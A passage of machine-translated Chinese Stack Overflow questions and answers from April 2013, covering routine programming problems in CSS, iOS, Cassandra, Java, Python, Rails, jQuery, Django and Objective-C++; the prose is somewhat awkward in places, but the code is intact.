这是应用程序的html：

```
<!DOCTYPE html>
<html>
<head>
  <title>Blog</title>
  <%= stylesheet_link_tag    "application", :media => "all" %>
  <%= javascript_include_tag "application" %>
  <%= csrf_meta_tags %>

</head>
<body>
<%= render 'layouts/header' %>
<div id='wrapper'>

<%= yield %>

<%= render 'layouts/footer' %>
</div>
</body>
</html> 
```

这是标题html：

```
<div id="nav">
    <div id='navwrap'>
    <ul id='nav-list'>
    <li><%= link_to 'Home', root_path %></li>
    <li><%= link_to 'About', '#' %></li>
    <li><%= link_to 'Projects', '#' %></li>
    <li><%= link_to 'Blog', '#' %></li>
</ul>
</div>
</div> 
```

我确定我只是忽略了一些简单的事情，但这让我发疯了！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T23:43:21.670

`padding: none;``padding`不是属性的有效值。

尝试`padding:0`代替它

```
body{
    background-color: #Dee0D5;
    margin:0;
    padding:0;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T23:49:51.327

将 padding-top 设置为 -5px？我相信 5px 是默认边距。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-24T23:55:29.453

如果我没记错的话，我认为您的`<ul>`元素可能具有默认边距和/或填充 - 尝试使其具有边距：0；此外，您的`<li>`CSS 规则似乎嵌套在`<ul>`样式规则中。

# ios - 在我的应用程序中使用 Apple 的白色标签栏

> ID：16204061
> 
> 赞同：-2
> 
> 时间：2013-04-24T23:39:51.390
> 
> 标签：ios, user-interface

Apple 应用程序中使用的标签栏，例如音乐，是否可以在我的 iOS 应用程序中使用？有没有办法在不创建我自己的背景的情况下调用它？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T00:00:59.630

我认为您要做的是更改导航栏或标签栏颜色。您可以通过外观代理更改应用程序中出现的任何位置的导航栏/标签栏的颜色。尽管此方法仅适用于 iOS 5 及更高版本。

```
 [[UINavigationBar appearance] setTintColor:[UIColor whiteColor]]; 
```

或者

```
 [[UITabBar appearance] setTintColor:[UIColor whiteColor]]; 
```

或者，如果您需要针对 iOS4 或更低版本/需要将颜色更改应用于特定视图控制器而不是全局，您可以执行以下操作：

```
 currentViewController.navigationController.navigationBar.tintColor = [UIColor whiteColor]; 
```

当然，如果您需要比这些预设更具体的颜色值（如`[UIColor whiteColor]`），您可以随时参考[此处](http://developer.apple.com/library/ios/documentation/UIKit/Reference/UIColor_Class/Reference/Reference.html)`UIColor`的文档 以获得更多指导。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-24T23:45:18.490

它很可能是您需要自己构建的自定义标签栏。`UITabbar`具有`tintColor`您也可以使用的属性。

查看本教程，了解如何[自定义标签栏](http://www.appcoda.com/ios-programming-how-to-customize-tab-bar-background-appearance/)。

# c# - 如何将照片位置保存为类的字符串变量？

> ID：16204065
> 
> 赞同：0
> 
> 时间：2013-04-24T23:40:08.410
> 
> 标签：c#, windows-runtime, windows-phone-8, winrt-xaml

在我的应用程序中，用户使用 PhotoChooserTask 从相机胶卷中选择一张照片。我想将照片的**位置**保存到 LogEntry 类的字符串变量中，以便稍后根据需要重新加载照片。

Log 是 LogEntry 类项的 ObservableCollection。

```
public ObservableCollection<LogEntry> Log = new ObservableCollection<LogEntry>(); 
```

如果不将照片保存到 LogEntry 中的字节数组中并且不将照片保存到独立存储中，我该如何做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-10T00:09:24.043

首先，我将所选图片的名称和专辑的名称保存在我的每个 LogEntry 项目的属性中。

从相册加载图片：

```
 public BitmapImage GetPicture( string FileName )
        {
        // Work around for known bug in the media framework.  Hits the static constructors
        // so the user does not need to go to the picture hub first.
        MediaPlayer.Queue.ToString();

        MediaLibrary ml = null;
        PictureAlbum cameraRoll = null;
        PictureAlbum savedPictures = null;
        PictureAlbum samplePictures = null;
        PictureAlbum favoritePictures = null;

        int index = FileName.IndexOf( "\\" );
        string albumName = FileName.Remove( index, FileName.Length - index );
        string fileName = FileName.Remove( 0, index + 1 );

        foreach ( MediaSource source in MediaSource.GetAvailableMediaSources() )
            {
            if ( source.MediaSourceType == MediaSourceType.LocalDevice )
                {
                ml = new MediaLibrary( source );
                PictureAlbumCollection allAlbums = ml.RootPictureAlbum.Albums;

                foreach ( PictureAlbum album in allAlbums )
                    {
                    if ( album.Name == "Camera Roll" )
                        {
                        cameraRoll = album;
                        }
                    else if ( album.Name == "Saved Pictures" )
                        {
                        savedPictures = album;
                        }
                    else if ( album.Name == "Sample Pictures" )
                        {
                        samplePictures = album;
                        }
                    else if ( album.Name == "Favorite Pictures" )
                        {
                        favoritePictures = album;
                        }
                    }
                }
            }

        PictureAlbum Album;
        switch ( albumName )
            {
            case "Camera Roll":
                Album = cameraRoll;
                break;

            case "Saved Pictures":
                Album = savedPictures;
                break;

            case "Sample Pictures":
                Album = samplePictures;
                break;

            case "Favorite Pictures":
                Album = favoritePictures;
                break;

            default:
                Album = null;
                break;
            }

        if ( Album == null )
            {
            return new BitmapImage();
            }

        BitmapImage b = new BitmapImage();
        foreach ( Picture p in Album.Pictures.Take( Album.Pictures.Count ) )
            {
            if ( fileName == p.Name )
                {
                b.SetSource( p.GetThumbnail() );
                break;
                }
            }

        return b;
        } 
```

# cassandra - 在重新平衡 Cassandra 集群时增加已用空间

> ID：16204066
> 
> 赞同：1
> 
> 时间：2013-04-24T23:40:12.710
> 
> 标签：cassandra

举个例子：我有 2 个 Cassandra 节点，每个节点 1Gb 数据，复制因子为 1。我使用具有 100Mb sstable 大小的 Leveled compaction 的单列族，如下所示：

```
create column family ColFamily with key_validation_class=UTF8Type 
  and compaction_strategy=LeveledCompactionStrategy 
  and compaction_strategy_options={sstable_size_in_mb: 100}; 
```

我想添加额外的节点。数据将在 3 个节点之间重新平衡：每个节点约 0,667 Mb。正确的？

但是，在重新平衡过程正在进行时，每个节点上的已用空间将如何增加？高峰会是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-26T10:20:36.857

在 Cassandra 1.2 和虚拟节点之前，您必须在添加新节点后自己重新分配数据。

如果您的两个节点当前是平衡的，即每个节点都有 50% 的环，那么令牌将是

```
node1: 0
node2: 85070591730234615865843651857942052864 
```

（或移位，但我假设 node1 具有令牌 0）。node2 的令牌是 2^127/2。你想结束

```
node1: 0
node2: 56713727820156410577229101238628035242
node3: 113427455640312821154458202477256070484 
```

其中 node2 的令牌是 2^127/3，node3 的令牌是 (2^127/3)*2。您需要做的是引导 node3 并将 initial_token 设置为上面的令牌。这会从 node1 复制数据，因为 node3 的令牌在 node1 之前（令牌环被环绕）。

现在 node3 将拥有 1/6 的数据，node2 仍然拥有 1/2，node1 将存储 1/2 但只负责 1/3。您现在可以在 node1 上运行“nodetool cleanup”以删除它复制到 node3 的数据。这会将 node1 的数据减少到大约 677MB。

现在您需要将 node2 的令牌移动到其最终位置。这会将数据从节点 2 复制到节点 3，使节点 3 达到其数据的 1/3 配额，大约 667 MB。现在您可以在 node2 上运行“nodetool cleanup”来删除它刚刚复制到 node3 的数据。现在重新平衡已经完成。

这意味着在重新平衡期间没有节点存储超过 1 GB 的数据。

一般来说，如果您有更多的节点或更高的复制因子，如果您在每次移动刚移动的节点后运行清理，您总是可以在不增加存储在任何现有节点上的数据的情况下进行重新平衡。

最后，如果您有 Cassandra 1.2 和虚拟节点，则可以随机选择令牌，这样在您添加新节点时会立即提供均匀的负载，无需任何重新平衡（手动或自动）。这不仅更容易，而且只需添加一个节点就可以节省在集群周围复制恒定比例的数据。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-05-01T17:21:08.790

没有用于添加新节点的额外空间。但是，您必须对令牌范围缩小的节点运行清理以从移动中恢复空间，但您可能希望首先重新平衡环（令牌移动）以实现均匀分布。

这个过程在 Datastax 网站上的 Cassandra 文档中有很好的记录，请阅读它以获得比我能给出的更好和更简洁的解释。

除此之外，还有一些评论：

*   100MB的水平似乎有点高。事实上，几乎可以肯定只有 1GB 的数据。您是否有充分的理由偏离（通常非常充分的）默认值？
*   RF 小于 3 几乎不是您在生产中想要的。
*   正如理查德所说，你应该看看 vnodes。它们还不是默认设置，但只要您运行的是 cassandra 1.2.x，它们就值得一试。

# arrays - 使用 Integer.parseInt 的数组索引越界异常

> ID：16204071
> 
> 赞同：1
> 
> 时间：2013-04-24T23:40:54.817
> 
> 标签：arrays, file, exception, parseint

我的程序符合要求，但是当我运行程序时，它给了我一个“数组索引越界异常”

```
public void readBoard(String filename) throws Exception { 
    File f = new File("myBoard.csv"); 
    Scanner reader = new Scanner(f); 
    while(reader.hasNext()){ 
        String line = reader.nextLine(); 
        String [] b = line.split(","); 
        String type = b[0]; 
        int i = Integer.parseInt(b[1]); 
        int j = Integer.parseInt(b[2]); 
        if(type.equals("Chute")) 
            board[i][j] = new Chute(); 
        else if(type.equals("Ladder")) 
            board[i][j] = new Ladder(); 
} 
```

错误在 int i = Integer.parseInt(b[1]); 我的问题是我将 String [1] 和 [2] 转换为 int 的方式正确吗？我认为这不是因为我有一个数组越界异常。我猜这意味着它指向该区域的某个位置并且什么都没有。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T23:49:24.820

确保行拆分工作正常，并且您有 3 个不同的字符串 b[1] 或 b[2] 应该会导致错误。进行打印或调试以查看 b[0] 的值是多少。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T23:49:35.167

IndexOutOfBounds 确实意味着您正在尝试访问数组中不存在的元素。添加：

```
System.out.println("array size = " + b.length); 
```

看看数组实际上有多长。您希望数组的长度为 3，但根据实际读取的行和拆分它的方式，您似乎有一个长度为 1 的数组。这也有助于查看您的实际行试图分裂。

尝试这个：

```
public void readBoard(String filename) throws Exception{
    File f = new File("myBoard.csv");
    Scanner reader = new Scanner(f);
    while(reader.hasNext()){
        String line = reader.nextLine();

        // What line do we intend to process?

        System.out.println("Line = " + line);

        String [] b = line.split(",");

        // How long is the array?

        System.out.println("Array length = " + b.length);

        String type = b[0];
        int i = Integer.parseInt(b[1]);
        int j = Integer.parseInt(b[2]);
        if(type.equals("Chute"))
            board[i][j] = new Chute();
        else if(type.equals("Ladder"))
            board[i][j] = new Ladder();
    } 
```

每当您在开发代码的过程中，您都希望添加转储各种字段值的调试语句，以帮助您了解自己在做什么。在您的代码中添加一些关键的调试语句将帮助您协调您的假设（即“我的数组有三个元素”）与实际发生的事情（即“我的数组只有一个元素”）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T01:20:40.753

试试这个，因为它超出了数组大小为 1 的范围，你应该跳过所有大小为 1 的数组。

```
public void readBoard(String filename) throws Exception {
    File in = new File("myBoard.csv");
    Scanner reader = new Scanner(in);
    while (reader.hasNext()) {
        String line = reader.nextLine();
        String[] b = line.split(",");
        if (b.length != 1) {
            String type = b[0];
            int i = Integer.parseInt(b[1]);
            int j = Integer.parseInt(b[2]);
            if (type.equals("Chute"))
                board[i][j] = new Chute();
            else if (type.equals("Ladder"))
                board[i][j] = new Ladder();
        }
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-26T21:54:22.240

在 while 循环之前执行此操作

```
reader.nextLine[]; 
```

因为文件的第一行只有一个元素。

# delphi - 树视图中的图像索引和状态索引

> ID：16204075
> 
> 赞同：1
> 
> 时间：2013-04-24T23:41:22.160
> 
> 标签：delphi, treeview, wmi, delphi-xe2

我编写了一个函数，该函数使用 WMI 获取计算机上已安装软件的列表

```
begin
  Result:='';
  FWbemObjectSet:= FWMIService.ExecQuery(Format('Select %s from %s',[WMIProperty, WMIClass]),'WQL',wbemFlagForwardOnly);
  oEnum         := IUnknown(FWbemObjectSet._NewEnum) as IEnumVariant;

  while oEnum.Next(1, FWbemObject, iValue) = 0 do
    begin
      if not VarIsNull(FWbemObject.Properties_.Item(WMIProperty).Value) then
      Result:=FWbemObject.Properties_.Item(WMIProperty).Value;
      ClientForm.TreeView1.Items.AddChild(Node, Format('%s',[String(FWbemObject.Name)]));
      FWbemObject:=Unassigned;
    end;

end; 
```

该函数通过以下代码在 FormCreate 处执行：

```
GETWMIstringSW('Win32_Product','Name'); 
```

我的问题是，如何更改 ImageIndex 和 StateIndex？我想在函数中添加另一行代码来获取版本，就像这样

```
(Format('Version %s',[String(FWbemObject.Version)])); 
```

但是我被卡住了，你们能指出我正确的方向吗？太感谢了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T00:11:03.437

[AddChild](http://docwiki.embarcadero.com/Libraries/XE2/en/Vcl.ComCtrls.TTreeNodes.AddChild)函数将一个实例返回到新节点，因此您需要保存该节点，然后修改属性。

```
Var
  LNode : TTreeNode;
begin
   ..
   LNode := ClientForm.TreeView1.Items.AddChild(Node, Format('%s',[String(FWbemObject.Name)]));
   LNode.StateIndex:=0;
   LNode.ImageIndex:=0;
   ..
   ..
end; 
```

# python - 符合 pep8 的深度字典访问

> ID：16204076
> 
> 赞同：16
> 
> 时间：2013-04-24T23:41:26.563
> 
> 标签：python, pep8

什么是符合 pep8 的深度字典访问方式？

```
dct = {
    'long_key_name_one': {
        'long_key_name_two': {
            'long_key_name_three': {
                'long_key_name_four': {
                    'long_key_name_five': 1
                }
            }
        }
    }
} 
```

E501 行太长（118 > 80 个字符）

```
print dct['long_key_name_one']['long_key_name_two']['long_key_name_three']['long_key_name_four']['long_key_name_five'] 
```

'[' 之前的 E211 空格

```
print dct['long_key_name_one']['long_key_name_two']\
    ['long_key_name_three']['long_key_name_four']['long_key_name_five'] 
```

E124 右括号与视觉缩进不匹配

```
print dct['long_key_name_one']['long_key_name_two'
    ]['long_key_name_three']['long_key_name_four']['long_key_name_five'] 
```

这通过了 pep8 但似乎不太理想

```
print dct['long_key_name_one']['long_key_name_two'][
    'long_key_name_three'
]['long_key_name_four']['long_key_name_five'] 
```

有没有办法打破线路，使其看起来不错并且符合 pep8 标准？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-24T23:52:44.380

也许不是最好的方法，但它有效：

```
a = dct['long_key_name_one']['long_key_name_two']
b = a['long_key_name_three']['long_key_name_four']['long_key_name_five'] 
```

但这也有效，这是建议的方法：

```
print (dct['long_key_name_one']['long_key_name_two']
       ['long_key_name_three']['long_key_name_four']
       ['long_key_name_five']) 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-25T08:47:02.983

如果你在一个函数中使用它（并且你可以使用 print() 作为一个函数，因为 2.7 afaik）

您可以只在括号内使用隐式连接

```
print(dct['long_key_name_one']
         ['long_key_name_two']
         ['long_key_name_three']
         ['long_key_name_four']
         ['long_key_name_five']) 
```

# python - TypeError：'Cursor' 类型的对象没有 len()

> ID：16204077
> 
> 赞同：19
> 
> 时间：2013-04-24T23:41:40.723
> 
> 标签：python, mongodb, pymongo, database-cursor

我收到此错误：

> TypeError：'Cursor' 类型的对象没有 len()

当我尝试执行时：

```
reply = db['test'].find({"date":{"$gt":date_query}} ,{"date":1,"route_id":1,"loc":1,"_id":0})

length = len(reply) 
```

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2013-04-24T23:52:53.440

pymongo[游标](http://api.mongodb.org/python/current/api/pymongo/cursor.html)有一个方法`count()`可以返回您要查找的内容：

```
reply = db['test'].find(
  {"date":{"$gt":date_query}},
  {"date":1,"route_id":1,"loc":1,"_id":0}
)

length = reply.count() 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2016-12-20T11:29:50.530

是的，伯爵会为您完成这项工作。

```
length = reply.count() 
```

或者

```
length = reply.count(with_limit_and_skip=False) 
```

不得不忍受很多因为长度=计数（回复）也没有工作。由于我还不允许发表评论，所以想留下这个答案。希望这将有助于某人节省一些时间。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2018-10-26T08:53:52.353

开始`Mongo 4.0.3`/ `PyMongo 3.7.0`，您可以替代地使用[`count_documents`](https://api.mongodb.com/python/3.7.2/api/pymongo/collection.html?highlight=count#pymongo.collection.Collection.count_documents)而不是`count`a `cursor`：

```
db.collection.count_documents({ "a": 2 })
# where { "a": 2 } is whatever filtering query 
```

`db.collection.count_documents`是现已弃用的[`db.collection.count`](https://api.mongodb.com/python/3.7.2/api/pymongo/collection.html?highlight=count#pymongo.collection.Collection.count).

# ruby-on-rails - 为什么将 created_at 与当前 Date 进行比较会导致错误？

> ID：16204080
> 
> 赞同：0
> 
> 时间：2013-04-24T23:41:45.303
> 
> 标签：ruby-on-rails

我正在尝试使用将`created_at`上次发布的评论与今天进行比较的“if 语句”。

但是，这会返回错误：

**应用助手**

```
def chat_button(community)
  if community.comments.last.created_at == Date.current.to_date
    'Posted today'
  else
    'No post today'
  end
end 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T23:57:40.303

您正在将`DateTime`( `created_at`) 与 a进行比较`Date`。小时/分钟/秒将导致比较失败。试试这个：

```
if community.comments.last.created_at.to_date == Date.current 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T01:07:34.717

还有一种更短的方法可以查看给定的日期时间是否是今天。

```
1.minute.ago.today? #=> true
1.day.ago.today? #=> false 
```

在您的情况下，这将是：

```
comment = community.comments.last
if comment && comment.created_at.today? 
```

请注意，此方法由 Rails 的 Active Support 提供，它不存在于 Ruby 标准库中。

# python - 为什么 list 和 tuple 会改变 enumerate 的输出？

> ID：16204085
> 
> 赞同：3
> 
> 时间：2013-04-24T23:42:10.477
> 
> 标签：python, list, tuples, enumerate

我对以下行为感到惊讶：

```
>>> a=['a','b','c','d','e','f','g']
>>> en=enumerate(a)
>>> list(en)
[(0, 'a'), (1, 'b'), (2, 'c'), (3, 'd'), (4, 'e'), (5, 'f'), (6, 'g')]
>>> list(en)
[]
>>> # en changed?   let's try that again!
>>> a=['a','b','c','d','e','f','g']
>>> en=enumerate(a)
>>> tuple(en)
((0, 'a'), (1, 'b'), (2, 'c'), (3, 'd'), (4, 'e'), (5, 'f'), (6, 'g'))
>>> tuple(en)
()
>>> # en changes again? 
```

我假设这`list()`只会从 en 中的数据构建一个列表，并且不会以任何方式更改它。与 相同`tuple()`。但它们都以“深刻”的方式影响 en。我是误解了什么`list()`，`tuple()`还是我误解了`enumerate()`？谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-24T23:48:46.533

我认为您误解了 enumerate()。

```
>>> en=enumerate(a) 
```

是生成器/迭代器，而不是数据结构。一旦你通过'en'运行一次，通过创建列表，生成器已经运行并且什么都没有了。再次尝试 list(en) 是尝试遍历已到达其末尾的迭代器，因此那里什么也没有。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-24T23:47:53.830

[`enumerate`](http://docs.python.org/2/library/functions.html#enumerate)返回一个[迭代器](http://docs.python.org/2/glossary.html#term-iterator)，而不是像列表这样的[可迭代对象。](http://docs.python.org/2/glossary.html#term-iterable)这意味着`list`and`tuple`只能`enumerate`通过重复调用其`next()`方法直到迭代器耗尽，才能获取 ' 的返回值的所有元素，之后迭代器和 Python 中的所有其他迭代器一样，将无法再产生任何元素。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-25T00:01:56.573

`list`和也没有什么特别之处`tuple`。无论您如何消费`en`，这都会发生，包括通过您自己的手写`for`循环：

```
>>> a=['a','b','c','d','e','f','g']
>>> en=enumerate(a)
>>> en
<enumerate object at 0x21172d0>
>>> for index, elem in en:
...   print index, elem
... 
0 a
1 b
2 c
3 d
4 e
5 f
6 g
>>> for index, elem in en:
...   print index, elem
... 
>>> 
```

请注意，这`en`是一个“枚举对象”，而不是列表或元组，并且打印它并没有尝试打印其内容。这是因为`enumerate`实际上并没有生成包含所有相同数据`a`以及索引值的数据结构。相反，它返回一个小对象，该对象在内部记住它正在迭代的容器、它到达的位置以及它达到的计数。这就是生成“下一个”值所需的全部内容，因此即使它不是容器本身也可以对其进行迭代。

这样做的原因是人们几乎从不存储 的结果`enumerate`，通常会调用它以立即使用循环对其进行迭代`for`。为此，花时间和内存来构建所有数据的副本并一次将所有索引保存在内存中是浪费时间和内存的。随时生产它们就足够了。

如果您确实需要存储生成的数据`enumerate`以多次使用（或在生成它的地方以外的其他地方使用），那么您将需要该副本。最简单的方法实际上是做类似`en = list(enumerate(a))`. 然后您可以`en`完全按照您的预期使用。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-04-24T23:47:52.503

您可能不完全理解`enumerate()`（或者，我可能误解了这个问题）。查看`help(enumerate)`文档（特别是关于*产生* **索引**和**值*****对***的部分：

 ****```
Help on class enumerate in module __builtin__:

class enumerate(object)
 |  enumerate(iterable[, start]) -> iterator for index, value of iterable
 |
 |  Return an enumerate object.  iterable must be another object that supports
 |  iteration.  The enumerate object yields pairs containing a count (from
 |  start, which defaults to zero) and a value yielded by the iterable argument.
 |  enumerate is useful for obtaining an indexed list:
 |      (0, seq[0]), (1, seq[1]), (2, seq[2]), ...
 |
 |  Methods defined here:
 |
 |  __getattribute__(...)
 |      x.__getattribute__('name') <==> x.name
 |
 |  __iter__(...)
 |      x.__iter__() <==> iter(x)
 |
 |  next(...)
 |      x.next() -> the next value, or raise StopIteration
 |
 |  ----------------------------------------------------------------------
 |  Data and other attributes defined here:
 |
 |  __new__ = <built-in method __new__ of type object>
 |      T.__new__(S, ...) -> a new object with type S, a subtype of T 
```****

# php - jquery parseJSON 处理 php 错误

> ID：16204087
> 
> 赞同：1
> 
> 时间：2013-04-24T23:42:14.093
> 
> 标签：php, jquery

是否有任何巧妙的方法来处理数据对象中返回的 php 错误。目前我偶尔会得到类似的东西：

```
<br />
<font size='1'><table class='xdebug-error'
..... 
```

这通常后面是我期待的 json 对象。有没有系统的方法来查找这些错误？我正在使用的一个示例调用可能是：

```
function getMyCharities(callback) {
$.post("my_file.php", function(data) {
    callback(data);
});
} 
```

在我发现的 jquery 文档中：

```
 .done(function() { alert("second success"); }) 
.fail(function() { alert("error"); })
.always(function() { alert("finished"); }); 
```

但这些不处理这种类型的错误，因为我已经测试过了。如果可能的话，我也不想构建错误解析器。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-24T23:48:03.593

处理这些错误的正确方法是在 PHP 中关闭错误报告。**您不应该为生产站点打开错误报告。**

关闭错误报告后，所有 PHP 错误都将返回一个服务器错误，然后您的promise 对象的回调`HTTP 500`将捕获该错误。`fail``$.post`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T23:52:18.543

我认为这些成功/失败方法与对服务器的 ajax 调用有关。在您的情况下，服务器正在返回具有正确 http 状态的数据。您需要在成功回调时直接解析“数据”对象，以检查失败迹象（基于 json 标志 ({isFailure: 1}) 或最坏情况，基于字符串）。如果没有，您将需要服务器以某种方式失败，因此当进行 ajax 调用时，调用将失败，您可以在页面上的“失败”回调中处理此问题。

# php - kendoUI，如何让 onclick 功能在 kendoPanelBar 上工作

> ID：16204089
> 
> 赞同：0
> 
> 时间：2013-04-24T23:42:26.510
> 
> 标签：php, javascript, codeigniter, kendo-ui

我正在尝试实现 kendoPanelBar。到目前为止它运行良好，但我希望点击事件在我的 kendoPanelBar 中工作。

我的意思是当我点击子菜单时，它应该执行一些功能。

我试过这样：

```
{
     text: "Search",
     items: [
         { text: "Winning Prize Bond", url: "#", click:onClick },
         { text: "User" }
     ]
}, 
```

但是 onclick 功能不起作用。我什至尝试过选择。

请参阅我的 jsfiddle [http://jsfiddle.net/Wu8MS/6/](http://jsfiddle.net/Wu8MS/6/)。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T10:28:46.210

Kendo UI PanelBar 中没有单独的项目事件。您可以绑定到 PanelBar 具有的选择事件，它会将所选项目传递给您。检查有关它的文档：

[http://docs.kendoui.c​​om/api/web/panelbar#events-select](http://docs.kendoui.com/api/web/panelbar#events-select)

# java - 与数据库的 Java 连接不起作用

> ID：16204092
> 
> 赞同：-2
> 
> 时间：2013-04-24T23:42:32.357
> 
> 标签：java, connection, database-connection

我需要有关此代码的帮助以建立与数据库的连接。

```
try
{
String str="SELECT * FROM Author WHERE city LIKE 'P%'";
 Class.forName("sun.jdbc.odbc.JdbcOdbcDriver");
Connection con =
DriverManager.getConnection     
("jdbc:odbc:myds;databaseName=Library;user=sa;password=password123");
Statement  =con.createStatement();
ResultSet rs= executeQuery();
System.out.println("Author ID\tAuthor Name\tCity");
while (rs.next())
{
String id=rs.getString("au_id");
String name=rs.getString("au_name");
String city=rs.getString("city");
System.out.print(id+"\t");
if (name.length() <=7)
System.out.print(name+"\t\t");
else
System.out.print("\t"+name+"\t");
System.out.println(city);
}
}
catch(Exception ex)
{
System.out.println("Error occurred");
System.out.println("Error:"+ex); 
```

上面的代码有什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T23:49:02.010

我想应该是这样的

```
String str="SELECT * FROM Author WHERE city LIKE 'P%'";
// Some stuff 
Statement stmt = con.createStatement(); //stmt added
// Some more stuff 
ResultSet rs = stmt.executeQuery(str); // stmt and str added 
```

您应该查看[使用 Java 应用程序执行 SQL 查询。](http://www.roseindia.net/jsp/execute-sql-query.shtml)

# jquery - 王牌标签未绘制

> ID：16204093
> 
> 赞同：0
> 
> 时间：2013-04-24T23:42:35.027
> 
> 标签：jquery, ace-editor

我希望我能把自己说得足够清楚，让你明白。

我正在尝试将 ace 集成到我的网站中。唯一的问题是，如果我使用 tab 键，文本不会重新定位。此外，如果我单击内部开始编辑，该字符将被插入左侧 4 个字符。我认为`\t`角色没有被绘制出来。

这就是现在的样子，但是`<h1>`and`<p>`标记应该缩进 1 个选项卡（并且选择和编辑的行为就像已绘制选项卡一样）。 ![它看起来如何](https://i.stack.imgur.com/ThEUm.png)

按以下顺序从 src-min-noconflict 加载 ace 文件：

*   王牌.js
*   模式-html.js
*   主题终端.js

激活编辑器的代码

```
$(document).ready(function(){
    var editor = ace.edit('editor');

    editor.setTheme('ace/theme/terminal');
    editor.getSession().setMode('ace/mode/html');

    editor.getSession().setFoldStyle('manual');
    editor.setSelectionStyle('line');
    editor.setHighlightActiveLine(true);
    editor.setShowInvisibles(false);
    editor.setDisplayIndentGuides(true);
    editor.renderer.setHScrollBarAlwaysVisible(false);
    editor.setAnimatedScroll(false);
    editor.renderer.setShowGutter(true);
    editor.renderer.setShowPrintMargin(false);
    editor.getSession().setUseSoftTabs(false);
    editor.setHighlightSelectedWord(true);

    $('textarea[name="new_content"]').hide();
    editor.getSession().setValue($('textarea[name="new_content"]').val());

    $('form.form-textarea').on('submit', function(){
        $('textarea[name="new_content"]').val(editor.getSession().getValue());
    });
}); 
```

CSS

```
#editor {
    position: relative;
    height: 300px;
    font-family: Monaco, Menlo, 'Ubuntu Mono', Consolas, source-code-pro, monospace;
} 
```

HTML

```
<textarea name="new_content" class="hide">{ filled by the server with html }</textarea>
<div id="editor"></div> 
```

# django - 基于类的视图委托给另一个视图

> ID：16204096
> 
> 赞同：4
> 
> 时间：2013-04-24T23:42:46.680
> 
> 标签：django

是否可以将基于类的视图委托给特定的基于类的视图？具体来说，我想做的是拥有/指向一个名为“home”的视图，如果用户登录，则带有委托给视图 A 的主视图，或者如果没有用户登录，则指向视图 B。或者我可以做一个重定向到不同的 URL。我不确定这里的最佳做法是什么。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-25T03:00:11.470

您可以以与 url 中使用的相同方式从视图中调用另一个视图

```
class HomeView( TemplateView ):
  template_name="index.html"

  def dispatch( self, request, *args, **kwargs ):
    if request.user.is_authenticated():
      view=UserHomeView.as_view()
      return view( request, *args, **kwargs )
    return super( HomeView, self ).dispatch( request, *args, **kwargs )

class UserHomeView( TemplateView ):
  template_name="user.html" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T03:07:08.073

您可以只重定向到不同的 url，并且该 url 也由基于类的视图提供。

网址.py

```
url(r'^$', HomeView.as_view(), name='home'),
url(r'^login/', LoginView.as_view(), name='login'),
url(r'^welcome/$', WelcomeView.as_view(), name='welcome') 
```

视图.py

```
class HomeView(TemplateView):

    def get(self, request, *args, **kwargs):
        if request.user.is_authenticated():
            return HttpResponseRedirect(reverse('welcome'))
        else:
            return HttpResponseRedirect(reverse('login'))

class WelcomeView(TemplateView):

    def get(self, request, *args, **kwargs):
        #do something

class LoginView(TemplateView):

    def get(self, request, *args, **kwargs):
        #show login page 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T04:29:57.470

确保用户必须经过身份验证的最佳实践是使用 Mixin：

```
from django.contrib.auth.decorators import login_required
from django.utils.decorators import method_decorator
from django.views.generic import TemplateView

class LoginRequiredMixin(object):
    u"""Ensures that user must be authenticated in order to access view."""

    @method_decorator(login_required)
    def dispatch(self, *args, **kwargs):
        return super(LoginRequiredMixin, self).dispatch(*args, **kwargs)

class MyView(LoginRequiredMixin, TemplateView):

    def get(self, request, *args, **kwargs):
        #do something 
```

# c++ - Objective-C：如果我在 ARC 的函数中返回一个 C++ 对象，它会创建一个副本，我是否必须手动释放该副本？

> ID：16204100
> 
> 赞同：1
> 
> 时间：2013-04-24T23:43:07.317
> 
> 标签：c++, objective-c, memory-management, automatic-ref-counting, objective-c++

我正在尝试在 Objective-C 中传递对 C++ 对象的引用，因此我可以从另一个类访问该对象，特别是：

```
// ClassA
-(b2World *)getWorld{
    return world;
} 
```

在另一个类中，我会将返回的对象分配给 ivar

```
// ClassB
-(void)initClassB{
    world_ = [ClassA getWorld];
} 
```

或者直接访问返回对象的方法

```
// Classb
-(void)doSomething{
    [[ClassA getWorld] doSomething];
} 
```

在这两种情况下复制 c++ 对象（b2World）并且我必须在 ARC 环境中手动释放复制的对象是否正确？如果是这样，在 ARC 中传递 c++ 对象的最佳做法是什么（不应转移传递对象的所有权，例如它应该是弱引用）？

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：5
> 
